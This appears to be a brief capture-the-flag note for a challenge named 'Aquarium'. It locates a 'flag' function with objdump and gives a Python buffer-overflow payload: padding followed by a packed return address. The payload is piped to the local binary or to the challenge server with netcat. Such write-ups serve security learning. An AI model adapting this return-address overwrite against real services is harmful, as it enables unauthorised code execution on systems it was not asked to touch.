@@ -1,0 +1,27 @@
+Aquarium: BOF vulnerability 
+
+objdump -t ./exe
+
+00000000004011a6 g     F .text  0000000000000013              flag
+flag function: 0x4011a6
+
+payload: 
+
+import struct
+
+payload =  '1\n'
+payload += '1\n'
+payload += '1\n'
+payload += '9\n'
+payload += '9\n'
+payload += '9\n'
+payload += 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
+payload += 'aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll'
+payload += struct.pack("<I", 0x4011a6) # \xa6\x11\x40\x00
+
+./python_file | ./exe
+
+or 
+
+./python_file | nc IP PORT
+
